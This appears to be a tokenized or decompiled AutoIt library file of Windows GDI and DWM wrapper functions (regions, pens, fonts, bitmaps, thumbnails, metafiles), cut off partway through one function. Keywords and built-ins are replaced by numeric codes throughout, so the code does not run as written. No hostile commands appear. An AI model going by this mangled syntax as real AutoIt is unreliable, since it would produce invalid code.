32_WINAPI_CREATEELLIPTICRGN($TRECT)
28$ARET=58("gdi32.dll","handle","CreateEllipticRgnIndirect","struct*",$TRECT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_CREATEENHMETAFILE($HDC=0,$TRECT=0,$BPIXELS=40,$SFILEPATH="",$SDESCRIPTION="")
28$STYPEOFFILE="wstr"
43333($SFILEPATH,$STR_STRIPLEADING+$STR_STRIPTRAILING)5
$STYPEOFFILE="ptr"
$SFILEPATH=0
8
28$TDATA=0,$ADATA=331($SDESCRIPTION,"|",$STR_NOCOUNT)
4369($ADATA)<25
27$ADATA[2]
$ADATA[1]=""
8
13$I=0151
$ADATA[$I]=333($ADATA[$I],$STR_STRIPLEADING+$STR_STRIPTRAILING)
14
4($ADATA[0])2($ADATA[1])5
$TDATA=_WINAPI_ARRAYTOSTRUCT($ADATA)
8
28$IXP,$IYP,$IXM,$IYM,$HREF=0
4$BPIXELS1(223($TRECT))5
43$HDC5
$HREF=_WINAPI_GETDC(0)
8
$IXP=_WINAPI_GETDEVICECAPS($HREF,8)
$IYP=_WINAPI_GETDEVICECAPS($HREF,10)
$IXM=_WINAPI_GETDEVICECAPS($HREF,4)
$IYM=_WINAPI_GETDEVICECAPS($HREF,6)
4$HREF5
_WINAPI_RELEASEDC(0,$HREF)
8
13$I=1153162
69($TRECT,$I,280(66($TRECT,$I)*$IXM/$IXP*100))
14
13$I=2154162
69($TRECT,$I,280(66($TRECT,$I)*$IYM/$IYP*100))
14
8
28$ARET=58("gdi32.dll","handle","CreateEnhMetaFileW","handle",$HDC,$STYPEOFFILE,$SFILEPATH,"struct*",$TRECT,"struct*",$TDATA)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_CREATEFONTEX($IHEIGHT,$IWIDTH=0,$IESCAPEMENT=0,$IORIENTATION=0,$IWEIGHT=400,$BITALIC=40,$BUNDERLINE=40,$BSTRIKEOUT=40,$ICHARSET=1,$IOUTPRECISION=0,$ICLIPPRECISION=0,$IQUALITY=0,$IPITCHANDFAMILY=0,$SFACENAME="",$ISTYLE=0)
28$ARET=58("gdi32.dll","handle","CreateFontW","int",$IHEIGHT,"int",$IWIDTH,"int",$IESCAPEMENT,"int",$IORIENTATION,"int",$IWEIGHT,"dword",$BITALIC,"dword",$BUNDERLINE,"dword",$BSTRIKEOUT,"dword",$ICHARSET,"dword",$IOUTPRECISION,"dword",$ICLIPPRECISION,"dword",$IQUALITY,"dword",$IPITCHANDFAMILY,"wstr",_WINAPI_GETFONTNAME($SFACENAME,$ISTYLE,$ICHARSET))
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_CREATENULLRGN()
28$ARET=58("gdi32.dll","handle","CreateRectRgn","int",0,"int",0,"int",0,"int",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_CREATEPEN($IPENSTYLE,$IWIDTH,$ICOLOR)
28$ARESULT=58("gdi32.dll","handle","CreatePen","int",$IPENSTYLE,"int",$IWIDTH,"INT",$ICOLOR)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_CREATEPOLYGONRGN(3036$APOINT,$ISTART=0,$IEND=-1,$IMODE=1)
4__CHECKERRORARRAYBOUNDS($APOINT,$ISTART,$IEND,2,2)534287(@ERROR+10,@EXTENDED,0)
28$TAGSTRUCT=""
13$I=$ISTART15$IEND
$TAGSTRUCT&="int[2];"
14
28$TDATA=65($TAGSTRUCT)
28$ICOUNT=1
13$I=$ISTART15$IEND
13$J=0151
69($TDATA,$ICOUNT,$APOINT[$I][$J],$J+1)
14
$ICOUNT+=1
14
28$ARET=58("gdi32.dll","handle","CreatePolygonRgn","struct*",$TDATA,"int",$ICOUNT-1,"int",$IMODE)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_CREATERECTRGNINDIRECT($TRECT)
28$ARET=58("gdi32.dll","handle","CreateRectRgnIndirect","struct*",$TRECT)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_CREATESOLIDBITMAP($HWND,$ICOLOR,$IWIDTH,$IHEIGHT,$BRGB=1)
28$HDC=_WINAPI_GETDC($HWND)
28$HDESTDC=_WINAPI_CREATECOMPATIBLEDC($HDC)
28$HBITMAP=_WINAPI_CREATECOMPATIBLEBITMAP($HDC,$IWIDTH,$IHEIGHT)
28$HOLD=_WINAPI_SELECTOBJECT($HDESTDC,$HBITMAP)
28$TRECT=65($TAGRECT)
69($TRECT,1,0)
69($TRECT,2,0)
69($TRECT,3,$IWIDTH)
69($TRECT,4,$IHEIGHT)
4$BRGB5
$ICOLOR=19(17($ICOLOR,65280),21(17($ICOLOR,255),-16),21(17($ICOLOR,16711680),16))
8
28$HBRUSH=_WINAPI_CREATESOLIDBRUSH($ICOLOR)
43_WINAPI_FILLRECT($HDESTDC,$TRECT,$HBRUSH)5
_WINAPI_DELETEOBJECT($HBITMAP)
$HBITMAP=0
8
_WINAPI_DELETEOBJECT($HBRUSH)
_WINAPI_RELEASEDC($HWND,$HDC)
_WINAPI_SELECTOBJECT($HDESTDC,$HOLD)
_WINAPI_DELETEDC($HDESTDC)
43$HBITMAP534287(1,0,0)
34$HBITMAP
33
32_WINAPI_CREATETRANSFORM($NM11=1,$NM12=0,$NM21=0,$NM22=1,$NDX=0,$NDY=0)
28$TXFORM=65($TAGXFORM)
69($TXFORM,1,$NM11)
69($TXFORM,2,$NM12)
69($TXFORM,3,$NM21)
69($TXFORM,4,$NM22)
69($TXFORM,5,$NDX)
69($TXFORM,6,$NDY)
34$TXFORM
33
32_WINAPI_DELETEENHMETAFILE($HEMF)
28$ARET=58("gdi32.dll","bool","DeleteEnhMetaFile","handle",$HEMF)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_DPTOLP($HDC,36$TPOINT,$ICOUNT=1)
28$ARET=58("gdi32.dll","bool","DPtoLP","handle",$HDC,"struct*",$TPOINT,"int",$ICOUNT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_DRAWANIMATEDRECTS($HWND,$TRECTFROM,$TRECTTO)
28$ARET=58("user32.dll","bool","DrawAnimatedRects","hwnd",$HWND,"int",3,"struct*",$TRECTFROM,"struct*",$TRECTTO)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_DRAWBITMAP($HDC,$IX,$IY,$HBITMAP,$IROP=13369376)
28$TOBJ=65($TAGBITMAP)
28$ARET=58("gdi32.dll","int","GetObject","handle",$HBITMAP,"int",68($TOBJ),"struct*",$TOBJ)
4@ERROR23$ARET[0]534287(@ERROR+20,@EXTENDED,0)
$ARET=58("user32.dll","handle","GetDC","hwnd",0)
28$_HDC=$ARET[0]
$ARET=58("gdi32.dll","handle","CreateCompatibleDC","handle",$_HDC)
28$HSRCDC=$ARET[0]
$ARET=58("gdi32.dll","handle","SelectObject","handle",$HSRCDC,"handle",$HBITMAP)
28$HSRCSV=$ARET[0]
28$IERROR=0
$ARET=58("gdi32.dll","int","BitBlt","hwnd",$HDC,"int",$IX,"int",$IY,"int",66($TOBJ,"bmWidth"),"int",66($TOBJ,"bmHeight"),"hwnd",$HSRCDC,"int",0,"int",0,"int",$IROP)
4@ERROR23$ARET[0]5
$IERROR=@ERROR+1
8
58("user32.dll","int","ReleaseDC","hwnd",0,"handle",$_HDC)
58("gdi32.dll","handle","SelectObject","handle",$HSRCDC,"handle",$HSRCSV)
58("gdi32.dll","bool","DeleteDC","handle",$HSRCDC)
4$IERROR534287(10,0,0)
341
33
32_WINAPI_DRAWFOCUSRECT($HDC,$TRECT)
28$ARET=58("user32.dll","bool","DrawFocusRect","handle",$HDC,"struct*",$TRECT)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_DRAWLINE($HDC,$IX1,$IY1,$IX2,$IY2)
_WINAPI_MOVETO($HDC,$IX1,$IY1)
4@ERROR534287(@ERROR,@EXTENDED,40)
_WINAPI_LINETO($HDC,$IX2,$IY2)
4@ERROR534287(@ERROR+10,@EXTENDED,40)
3439
33
32_WINAPI_DRAWSHADOWTEXT($HDC,$STEXT,$IRGBTEXT,$IRGBSHADOW,$IXOFFSET=0,$IYOFFSET=0,$TRECT=0,$IFLAGS=0)
28$ARET
43223($TRECT)5
$TRECT=65($TAGRECT)
$ARET=58("user32.dll","bool","GetClientRect","hwnd",_WINAPI_WINDOWFROMDC($HDC),"struct*",$TRECT)
4@ERROR534287(@ERROR+10,@EXTENDED,0)
43$ARET[0]534287(10,0,0)
8
$ARET=58("comctl32.dll","int","DrawShadowText","handle",$HDC,"wstr",$STEXT,"uint",-1,"struct*",$TRECT,"dword",$IFLAGS,"int",__RGB($IRGBTEXT),"int",__RGB($IRGBSHADOW),"int",$IXOFFSET,"int",$IYOFFSET)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_DWMDEFWINDOWPROC($HWND,$IMSG,$WPARAM,$LPARAM)
28$ARET=58("dwmapi.dll","bool","DwmDefWindowProc","hwnd",$HWND,"uint",$IMSG,"wparam",$WPARAM,"lparam",$LPARAM,"lresult*",0)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34$ARET[5]
33
32_WINAPI_DWMENABLEBLURBEHINDWINDOW($HWND,$BENABLE=39,$BTRANSITION=40,$HRGN=0)
28$TBLURBEHIND=65("dword;bool;handle;bool")
28$IFLAGS=0
4$HRGN5
$IFLAGS+=2
69($TBLURBEHIND,3,$HRGN)
8
69($TBLURBEHIND,1,19($IFLAGS,5))
69($TBLURBEHIND,2,$BENABLE)
69($TBLURBEHIND,4,$BTRANSITION)
28$ARET=58("dwmapi.dll","long","DwmEnableBlurBehindWindow","hwnd",$HWND,"struct*",$TBLURBEHIND)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]534287(10,$ARET[0],0)
341
33
32_WINAPI_DWMENABLECOMPOSITION($BENABLE)
4$BENABLE5$BENABLE=1
28$ARET=58("dwmapi.dll","long","DwmEnableComposition","uint",$BENABLE)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]534287(10,$ARET[0],0)
341
33
32_WINAPI_DWMEXTENDFRAMEINTOCLIENTAREA($HWND,$TMARGINS=0)
43223($TMARGINS)5
$TMARGINS=_WINAPI_CREATEMARGINS(-1,-1,-1,-1)
8
28$ARET=58("dwmapi.dll","long","DwmExtendFrameIntoClientArea","hwnd",$HWND,"struct*",$TMARGINS)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]534287(10,$ARET[0],0)
341
33
32_WINAPI_DWMGETCOLORIZATIONCOLOR()
28$ARET=58("dwmapi.dll","long","DwmGetColorizationColor","dword*",0,"bool*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]534287(10,$ARET[0],0)
34288($ARET[2],$ARET[1])
33
32_WINAPI_DWMGETCOLORIZATIONPARAMETERS()
28$TDWMCP=65($TAGDWM_COLORIZATION_PARAMETERS)
28$ARET=58("dwmapi.dll","uint",127,"struct*",$TDWMCP)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]534287(10,$ARET[0],0)
34$TDWMCP
33
32_WINAPI_DWMGETWINDOWATTRIBUTE($HWND,$IATTRIBUTE)
28$TAGSTRUCT
23$IATTRIBUTE
215,9
$TAGSTRUCT=$TAGRECT
211
$TAGSTRUCT="uint"
216
34287(11,0,0)
24
28$TDATA=65($TAGSTRUCT)
28$ARET=58("dwmapi.dll","long","DwmGetWindowAttribute","hwnd",$HWND,"dword",$IATTRIBUTE,"struct*",$TDATA,"dword",68($TDATA))
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]534287(10,$ARET[0],0)
23$IATTRIBUTE
211
3466($TDATA,1)
216
34$TDATA
24
33
32_WINAPI_DWMINVALIDATEICONICBITMAPS($HWND)
28$ARET=58("dwmapi.dll","long","DwmInvalidateIconicBitmaps","hwnd",$HWND)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]534287(10,$ARET[0],0)
341
33
32_WINAPI_DWMISCOMPOSITIONENABLED()
28$ARET=58("dwmapi.dll","long","DwmIsCompositionEnabled","bool*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]534287(10,$ARET[0],0)
34$ARET[1]
33
32_WINAPI_DWMQUERYTHUMBNAILSOURCESIZE($HTHUMBNAIL)
28$TSIZE=65($TAGSIZE)
28$ARET=58("dwmapi.dll","long","DwmQueryThumbnailSourceSize","handle",$HTHUMBNAIL,"struct*",$TSIZE)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]534287(10,$ARET[0],0)
34$TSIZE
33
32_WINAPI_DWMREGISTERTHUMBNAIL($HDESTINATION,$HSOURCE)
28$ARET=58("dwmapi.dll","long","DwmRegisterThumbnail","hwnd",$HDESTINATION,"hwnd",$HSOURCE,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]534287(10,$ARET[0],0)
34$ARET[3]
33
32_WINAPI_DWMSETCOLORIZATIONPARAMETERS($TDWMCP)
28$ARET=58("dwmapi.dll","uint",131,"struct*",$TDWMCP,"uint",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]534287(10,$ARET[0],0)
341
33
32_WINAPI_DWMSETICONICLIVEPREVIEWBITMAP($HWND,$HBITMAP,$BFRAME=40,$TCLIENT=0)
28$IFLAGS
4$BFRAME5
$IFLAGS=1
6
$IFLAGS=0
8
28$ARET=58("dwmapi.dll","uint","DwmSetIconicLivePreviewBitmap","hwnd",$HWND,"handle",$HBITMAP,"struct*",$TCLIENT,"dword",$IFLAGS)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]534287(10,$ARET[0],0)
341
33
32_WINAPI_DWMSETICONICTHUMBNAIL($HWND,$HBITMAP,$BFRAME=40)
28$IFLAGS
4$BFRAME5
$IFLAGS=1
6
$IFLAGS=0
8
28$ARET=58("dwmapi.dll","long","DwmSetIconicThumbnail","hwnd",$HWND,"handle",$HBITMAP,"dword",$IFLAGS)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]534287(10,$ARET[0],0)
341
33
32_WINAPI_DWMSETWINDOWATTRIBUTE($HWND,$IATTRIBUTE,$IDATA)
23$IATTRIBUTE
212,3,4,6,7,8,10,11,12
216
34287(1,0,0)
24
28$ARET=58("dwmapi.dll","long","DwmSetWindowAttribute","hwnd",$HWND,"dword",$IATTRIBUTE,"dword*",$IDATA,"dword",4)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]534287(10,$ARET[0],0)
341
33
32_WINAPI_DWMUNREGISTERTHUMBNAIL($HTHUMBNAIL)
28$ARET=58("dwmapi.dll","long","DwmUnregisterThumbnail","handle",$HTHUMBNAIL)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]534287(10,$ARET[0],0)
341
33
32_WINAPI_DWMUPDATETHUMBNAILPROPERTIES($HTHUMBNAIL,$BVISIBLE=39,$BCLIENTAREAONLY=40,$IOPACITY=255,$TRECTDEST=0,$TRECTSRC=0)
2830$TAGDWM_THUMBNAIL_PROPERTIES="struct;dword dwFlags;int rcDestination[4];int rcSource[4];byte opacity;bool opacity;bool fSourceClientAreaOnly;endstruct"
28$TTHUMBNAILPROPERTIES=65($TAGDWM_THUMBNAIL_PROPERTIES)
28$TSIZE,$IFLAGS=0
43223($TRECTDEST)5
$TSIZE=_WINAPI_DWMQUERYTHUMBNAILSOURCESIZE($HTHUMBNAIL)
4@ERROR5
34287(@ERROR+10,@EXTENDED,0)
8
$TRECTDEST=_WINAPI_CREATERECTEX(0,0,66($TSIZE,1),66($TSIZE,2))
8
13$I=1154
69($TTHUMBNAILPROPERTIES,2,66($TRECTDEST,$I),$I)
14
4223($TRECTSRC)5
$IFLAGS+=2
13$I=1154
69($TTHUMBNAILPROPERTIES,3,66($TRECTSRC,$I),$I)
14
8
69($TTHUMBNAILPROPERTIES,1,19($IFLAGS,29))
69($TTHUMBNAILPROPERTIES,4,$IOPACITY)
69($TTHUMBNAILPROPERTIES,5,$BVISIBLE)
69($TTHUMBNAILPROPERTIES,6,$BCLIENTAREAONLY)
28$ARET=58("dwmapi.dll","long","DwmUpdateThumbnailProperties","handle",$HTHUMBNAIL,"struct*",$TTHUMBNAILPROPERTIES)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]534287(10,$ARET[0],0)
341
33
32_WINAPI_ELLIPSE($HDC,$TRECT)
28$ARET=58("gdi32.dll","bool","Ellipse","handle",$HDC,"int",66($TRECT,1),"int",66($TRECT,2),"int",66($TRECT,3),"int",66($TRECT,4))
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_ENDPAINT($HWND,36$TPAINTSTRUCT)
28$ARET=58("user32.dll","bool","EndPaint","hwnd",$HWND,"struct*",$TPAINTSTRUCT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_ENDPATH($HDC)
28$ARET=58("gdi32.dll","bool","EndPath","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_ENUMDISPLAYMONITORS($HDC=0,$TRECT=0)
28$HENUMPROC=62("__EnumDisplayMonitorsProc","bool","handle;handle;ptr;lparam")
26$__G_VENUM[101][2]=[[0]]
28$ARET=58("user32.dll","bool","EnumDisplayMonitors","handle",$HDC,"struct*",$TRECT,"ptr",61($HENUMPROC),"lparam",0)
4@ERROR23$ARET[0]23$__G_VENUM[0][0]5
$__G_VENUM=@ERROR+10
8
60($HENUMPROC)
4$__G_VENUM534287($__G_VENUM,0,0)
__INC($__G_VENUM,-1)
34$__G_VENUM
33
32_WINAPI_ENUMDISPLAYSETTINGS($SDEVICE,$IMODE)
28$STYPEOFDEVICE="wstr"
43333($SDEVICE,$STR_STRIPLEADING+$STR_STRIPTRAILING)5
$STYPEOFDEVICE="ptr"
$SDEVICE=0
8
28$TDEVMODE=65($TAGDEVMODE_DISPLAY)
69($TDEVMODE,"Size",68($TDEVMODE))
69($TDEVMODE,"DriverExtra",0)
28$ARET=58("user32.dll","bool","EnumDisplaySettingsW",$STYPEOFDEVICE,$SDEVICE,"dword",$IMODE,"struct*",$TDEVMODE)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
28$ARESULT[5]
$ARESULT[0]=66($TDEVMODE,"PelsWidth")
$ARESULT[1]=66($TDEVMODE,"PelsHeight")
$ARESULT[2]=66($TDEVMODE,"BitsPerPel")
$ARESULT[3]=66($TDEVMODE,"DisplayFrequency")
$ARESULT[4]=66($TDEVMODE,"DisplayFlags")
34$ARESULT
33
32_WINAPI_ENUMFONTFAMILIES($HDC=0,$SFACENAME="",$ICHARSET=1,$IFONTTYPE=7,$SPATTERN="",$BEXCLUDE=40)
28$TLOGFONT=65($TAGLOGFONT)
28$TPATTERN=65("uint;uint;ptr;wchar["&(323($SPATTERN)+1)&"]")
69($TPATTERN,1,$IFONTTYPE)
43$SPATTERN5
69($TPATTERN,2,0)
69($TPATTERN,3,0)
6
69($TPATTERN,2,$BEXCLUDE)
69($TPATTERN,3,67($TPATTERN,4))
69($TPATTERN,4,$SPATTERN)
8
69($TLOGFONT,9,$ICHARSET)
69($TLOGFONT,13,0)
69($TLOGFONT,14,322($SFACENAME,31))
28$HCDC
43$HDC5
$HCDC=_WINAPI_CREATECOMPATIBLEDC(0)
6
$HCDC=$HDC
8
26$__G_VENUM[101][8]=[[0]]
28$HENUMPROC=62("__EnumFontFamiliesProc","int","ptr;ptr;dword;PTR")
28$ARET=58("gdi32.dll","int","EnumFontFamiliesExW","handle",$HCDC,"struct*",$TLOGFONT,"ptr",61($HENUMPROC),"struct*",$TPATTERN,"dword",0)
4@ERROR23$ARET[0]23$__G_VENUM[0][0]5
$__G_VENUM=@ERROR+10
8
60($HENUMPROC)
43$HDC5
_WINAPI_DELETEDC($HCDC)
8
4$__G_VENUM534287($__G_VENUM,0,0)
__INC($__G_VENUM,-1)
34$__G_VENUM
33
32_WINAPI_EQUALRECT($TRECT1,$TRECT2)
28$ARET=58("user32.dll","bool","EqualRect","struct*",$TRECT1,"struct*",$TRECT2)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_EQUALRGN($HRGN1,$HRGN2)
28$ARET=58("gdi32.dll","bool","EqualRgn","handle",$HRGN1,"handle",$HRGN2)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_EXCLUDECLIPRECT($HDC,$TRECT)
28$ARET=58("gdi32.dll","int","ExcludeClipRect","handle",$HDC,"int",66($TRECT,1),"int",66($TRECT,2),"int",66($TRECT,3),"int",66($TRECT,4))
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_EXTCREATEPEN($IPENSTYLE,$IWIDTH,$IBRUSHSTYLE,$IRGB,$IHATCH=0,$AUSERSTYLE=0,$ISTART=0,$IEND=-1)
28$ICOUNT=0,$TSTYLE=0
417($IPENSTYLE,255)=75
4__CHECKERRORARRAYBOUNDS($AUSERSTYLE,$ISTART,$IEND)534287(@ERROR+10,@EXTENDED,0)
$TSTYLE=65("dword["&($IEND-$ISTART+1)&"]")
13$I=$ISTART15$IEND
69($TSTYLE,1,$AUSERSTYLE[$I],$ICOUNT+1)
$ICOUNT+=1
14
8
28$TLOGBRUSH=65($TAGLOGBRUSH)
69($TLOGBRUSH,1,$IBRUSHSTYLE)
69($TLOGBRUSH,2,__RGB($IRGB))
69($TLOGBRUSH,3,$IHATCH)
28$ARET=58("gdi32.dll","handle","ExtCreatePen","dword",$IPENSTYLE,"dword",$IWIDTH,"struct*",$TLOGBRUSH,"dword",$ICOUNT,"struct*",$TSTYLE)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_EXTCREATEREGION($TRGNDATA,$TXFORM=0)
28$ARET=58("gdi32.dll","handle","ExtCreateRegion","struct*",$TXFORM,"dword",68($TRGNDATA),"struct*",$TRGNDATA)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_EXTFLOODFILL($HDC,$IX,$IY,$IRGB,$ITYPE=0)
28$ARET=58("gdi32.dll","bool","ExtFloodFill","handle",$HDC,"int",$IX,"int",$IY,"dword",__RGB($IRGB),"uint",$ITYPE)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_EXTSELECTCLIPRGN($HDC,$HRGN,$IMODE=5)
28$ARET=58("gdi32.dll","int","ExtSelectClipRgn","handle",$HDC,"handle",$HRGN,"int",$IMODE)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_FILLPATH($HDC)
28$ARET=58("gdi32.dll","bool","FillPath","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_FILLRGN($HDC,$HRGN,$HBRUSH)
28$ARET=58("gdi32.dll","bool","FillRgn","handle",$HDC,"handle",$HRGN,"handle",$HBRUSH)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_FLATTENPATH($HDC)
28$ARET=58("gdi32.dll","bool","FlattenPath","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_FRAMERGN($HDC,$HRGN,$HBRUSH,$IWIDTH,$IHEIGHT)
28$ARET=58("gdi32.dll","bool","FrameRgn","handle",$HDC,"handle",$HRGN,"handle",$HBRUSH,"int",$IWIDTH,"int",$IHEIGHT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_GDICOMMENT($HDC,$PBUFFER,$ISIZE)
28$ARET=58("gdi32.dll","bool","GdiComment","handle",$HDC,"uint",$ISIZE,"struct*",$PBUFFER)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_GETARCDIRECTION($HDC)
28$ARET=58("gdi32.dll","int","GetArcDirection","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,0)
4($ARET[0]<1)2($ARET[0]>2)534287(10,$ARET[0],0)
34$ARET[0]
33
32_WINAPI_GETBITMAPBITS($HBITMAP,$ISIZE,$PBITS)
28$ARET=58("gdi32.dll","long","GetBitmapBits","handle",$HBITMAP,"long",$ISIZE,"struct*",$PBITS)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_GETBITMAPDIMENSIONEX($HBITMAP)
28$TSIZE=65($TAGSIZE)
28$ARET=58("gdi32.dll","bool","GetBitmapDimensionEx","handle",$HBITMAP,"struct*",$TSIZE)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34$TSIZE
33
32_WINAPI_GETBKCOLOR($HDC)
28$ARET=58("gdi32.dll","dword","GetBkColor","handle",$HDC)
4@ERROR2($ARET[0]=-1)534287(@ERROR,@EXTENDED,-1)
34__RGB($ARET[0])
33
32_WINAPI_GETBOUNDSRECT($HDC,$IFLAGS=0)
28$TRECT=65($TAGRECT)
28$ARET=58("gdi32.dll","uint","GetBoundsRect","handle",$HDC,"struct*",$TRECT,"uint",$IFLAGS)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34288($ARET[0],$TRECT)
33
32_WINAPI_GETBRUSHORG($HDC)
28$TPOINT=65($TAGPOINT)
28$ARET=58("gdi32.dll","bool","GetBrushOrgEx","handle",$HDC,"struct*",$TPOINT)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34$TPOINT
33
32_WINAPI_GETBVALUE($IRGB)
3421(17(__RGB($IRGB),16711680),16)
33
32_WINAPI_GETCLIPBOX($HDC,36$TRECT)
$TRECT=65($TAGRECT)
28$ARET=58("gdi32.dll","int","GetClipBox","handle",$HDC,"struct*",$TRECT)
4@ERROR23$ARET[0]5
$TRECT=0
34287(@ERROR,@EXTENDED,0)
8
34$ARET[0]
33
32_WINAPI_GETCLIPRGN($HDC)
28$HRGN=_WINAPI_CREATERECTRGN(0,0,0,0)
28$IERROR=0
28$ARET=58("gdi32.dll","int","GetClipRgn","handle",$HDC,"handle",$HRGN)
4@ERROR2($ARET[0]=-1)5$IERROR=@ERROR+10
4$IERROR23$ARET[0]5
_WINAPI_DELETEOBJECT($HRGN)
$HRGN=0
8
34287($IERROR,0,$HRGN)
33
32_WINAPI_GETCOLORADJUSTMENT($HDC)
28$TADJUSTMENT=65($TAGCOLORADJUSTMENT)
28$ARET=58("gdi32.dll","bool","GetColorAdjustment","handle",$HDC,"struct*",$TADJUSTMENT)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34$TADJUSTMENT
33
32_WINAPI_GETCURRENTPOSITION($HDC)
28$TPOINT=65($TAGPOINT)
28$ARET=58("gdi32.dll","int","GetCurrentPositionEx","handle",$HDC,"struct*",$TPOINT)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34$TPOINT
33
32_WINAPI_GETDEVICEGAMMARAMP($HDC,36$ARAMP)
$ARAMP=0
28$TDATA=65("word[256];word[256];word[256]")
28$ARET=58("gdi32.dll","bool","GetDeviceGammaRamp","handle",$HDC,"struct*",$TDATA)
4@ERROR23$ARET[0]534287(@ERROR,@EXTENDED,0)
26$ARAMP[256][3]
13$I=0152
13$J=015255
$ARAMP[$J][$I]=66($TDATA,$I+1,$J+1)
14
14
341
33
32_WINAPI_GETDIBCOLORTABLE($HBITMAP)
28$HDC=_WINAPI_CREATECOMPATIBLEDC(0)
28$HSV=_WINAPI_SELECTOBJECT($HDC,$HBITMAP)
28$TPEAK=65("dword[256]")
28$IERROR=0
28$ARET=58("gdi32.dll","uint","GetDIBColorTable","handle",$HDC,"uint",0,"uint",256,"struct*",$TPEAK)
4@ERROR23$ARET[0]5$IERROR=@ERROR+10
_WINAPI_SELECTOBJECT($HDC,$HSV)
_WINAPI_DELETEDC($HDC)
4$IERROR534287($IERROR,0,0)
28$TDATA=65("dword["&$ARET[0]&"]")
4@ERROR534287(@ERROR+20,@EXTENDED,0)
_WINAPI_MOVEMEMORY($TDATA,$ARET[4],4*$ARET[0])
34288($ARET[0],$TDATA)
33
32_WINAPI_GETDIBITS($HDC,$HBITMAP,$ISTARTSCAN,$ISCANLINES,$PBITS,$TBI,$IUSAGE)
28$ARESULT=58("gdi32.dll","int","GetDIBits","handle",$HDC,"handle",$HBITMAP,"uint",$ISTARTSCAN,"uint",$ISCANLINES,"struct*",$PBITS,"struct*",$TBI,"uint",$IUSAGE)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_GETENHMETAFILE($SFILEPATH)
28$ARET=58("gdi32.dll","handle","GetEnhMetaFileW","wstr",$SFILEPATH)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_GETENHMETAFILEBITS($HEMF,36$PBUFFER)
28$ARET=58("gdi32.dll","uint","GetEnhMetaFileBits","handle",$HEMF,"uint",0,"ptr",0)
4@ERROR23$ARET[0]534287(@ERROR+50,@EXTENDED,0)
$PBUFFER=__HEAPREALLOC($PBUFFER,$ARET[0],1)
4@ERROR534287(@ERROR,@EXTENDED,0)
$ARET=58("gdi32.dll","uint","GetEnhMetaFileBits","handle",$HEMF,"uint",$ARET[0],"ptr",$PBUFFER)
43$ARET[0]534287(60,0,0)
34$ARET[2]
33
32_WINAPI_GETENHMETAFILEDESCRIPTION($HEMF)
